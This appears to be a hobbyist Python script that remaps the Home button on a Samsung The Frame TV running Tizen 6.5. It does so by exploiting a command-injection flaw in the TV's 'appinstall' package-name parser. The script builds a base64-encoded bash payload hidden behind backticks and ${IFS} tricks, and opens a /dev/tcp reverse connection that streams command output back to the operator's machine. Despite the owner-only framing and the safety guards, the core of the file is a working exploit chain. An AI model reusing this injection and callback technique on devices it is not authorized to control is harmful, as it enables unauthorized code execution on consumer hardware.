#!/usr/bin/env python3
# Home-button remap runner for Samsung The Frame (Tizen 6.5).
#
# This TV has intershell disabled (`sdb capability` -> intershell_support:disabled),
# so a normal `sdb shell <cmd>` runs nothing useful and `sdb pull /etc/*` is
# blocked. The only way to run code on the set as the SDK user (UID 901) is the
# well-known `0 appinstall` package-name command-execution path: the package
# "name" carries a backtick expansion that the installer's parser executes. The
# payload opens a TCP socket back to this machine and streams a staged script's
# output. This is a developer-mode self-modding technique for a TV YOU own; it
# is not a remote exploit (it needs Developer Mode on, your PC registered as the
# TV's Host PC IP, and sdb on the LAN).
#
# Modes:
#   inspect                      read-only; learn your firmware + current Home prefs (no build needed)
#   query                        read-only; run the compiled helper (needs ctl/out built)
#   apply   <baseline.json>      remap the Home button to your launcher
#   restore <baseline.json>      put your baseline back
#
# Config via environment:
#   TV_IP      (required)  the TV's address, e.g. 192.168.1.50
#   TV_MODEL   (optional)  modelName guard, e.g. QN50LS03BAGXZD; if set, the TV's
#                          HTTP info endpoint must report it or nothing is staged.
import base64, ipaddress, json, os, socket, subprocess, sys, uuid, urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent
OUT = HERE / 'ctl' / 'out'
STAGE = '/home/owner/share/tmp/sdk_tools'
SDB = os.environ.get('SDB') or str(Path.home() / 'tizen-studio/tools/sdb')

mode = sys.argv[1] if len(sys.argv) > 1 else 'inspect'
if mode not in ('inspect', 'query', 'apply', 'restore'):
    raise SystemExit('mode must be inspect | query | apply | restore')
baseline = sys.argv[2] if len(sys.argv) > 2 else None
if mode in ('apply', 'restore') and not baseline:
    raise SystemExit(mode + ' needs a baseline json path (make one from `query` output)')

host = os.environ.get('TV_IP')
if not host:
    raise SystemExit('Set TV_IP (e.g. export TV_IP=192.168.1.50)')
ipaddress.ip_address(host)

model_guard = os.environ.get('TV_MODEL')
if model_guard:
    with urllib.request.urlopen('http://' + host + ':8001/api/v2/', timeout=5) as r:
        info = json.load(r)
    got = info.get('device', {}).get('modelName')
    if got != model_guard:
        raise SystemExit('Model guard failed (%r != %r); nothing staged.' % (got, model_guard))

serial = host + ':26101'
def sdb(args, timeout=25):
    p = subprocess.run([SDB, *args], capture_output=True, text=True, timeout=timeout)
    if p.returncode:
        raise RuntimeError('sdb failed: ' + (p.stdout + p.stderr)[-300:])
    return p

sdb(['connect', serial])

# Decide what the remote bash should run, and stage the files it needs.
if mode == 'inspect':
    remote_script = STAGE + '/ghhome-inspect.sh'
    sdb(['-s', serial, 'push', str(HERE / 'inspect.sh'), remote_script])
    remote_cmd = 'cat %s | bash' % remote_script
else:
    if not (OUT / 'GlassHomeControl.dll').exists():
        raise SystemExit('Build the helper first: (cd ctl && ~/.dotnet/dotnet build -c Release -o out)')
    for suffix in ('dll', 'runtimeconfig.json', 'deps.json'):
        sdb(['-s', serial, 'push', str(OUT / ('GlassHomeControl.' + suffix)), STAGE + '/GlassHomeControl.' + suffix])
    remote_baseline = STAGE + '/ghhome-baseline.json'
    dotnet_cmd = '/usr/bin/dotnet ' + STAGE + '/GlassHomeControl.dll ' + mode
    if baseline:
        sdb(['-s', serial, 'push', str(Path(baseline).resolve()), remote_baseline])
        dotnet_cmd += ' ' + remote_baseline
    remote_script = STAGE + '/ghhome-run.sh'
    tmp = HERE / '.ghhome-run.sh'
    tmp.write_text('set -u\nprintf GHHOME_RUN_BEGIN\\n\n%s 2>&1\nprintf GHHOME_RUN_END\\n\n' % dotnet_cmd)
    sdb(['-s', serial, 'push', str(tmp), remote_script]); tmp.unlink()
    remote_cmd = 'cat %s | bash' % remote_script

# Fire the staged script as UID 901 via the appinstall name-parsing path, with a
# TCP callback that streams its output back here.
token = uuid.uuid4().hex[:12]
with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
    route.connect((host, 9)); local = route.getsockname()[0]
with socket.socket() as listener:
    listener.bind((local, 0)); listener.listen(1); listener.settimeout(30)
    port = listener.getsockname()[1]
    command = 'exec 3<>/dev/tcp/%s/%d;%s >&3 2>&3;exec 3>&-' % (local, port, remote_cmd)
    wrapper = '/bin/mkdir /tmp/s-%s 2>/dev/null&&{ %s;}' % (token, command)
    encoded = base64.b64encode(wrapper.encode()).decode()
    name = 'new2.tpk`printf${IFS}%s${IFS}' + encoded + '|base64${IFS}-d|bash`.tpk'
    argument = '0 appinstall tpk ' + name
    if len(argument.encode()) > 400:
        raise SystemExit('Injection argument too long (%d bytes); refusing.' % len(argument.encode()))
    proc = subprocess.Popen([SDB, '-s', serial, 'shell', argument],
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    try:
        conn, peer = listener.accept()
        if peer[0] != host:
            raise RuntimeError('Unexpected callback peer %r; no data accepted.' % (peer,))
        chunks = []
        with conn:
            conn.settimeout(20)
            while True:
                b = conn.recv(65536)
                if not b: break
                chunks.append(b)
        out = b''.join(chunks).decode(errors='replace')
        try: proc.communicate(timeout=8)
        except subprocess.TimeoutExpired: proc.terminate()
        print(out)
    finally:
        if proc.poll() is None:
            proc.terminate(); proc.communicate(timeout=3)
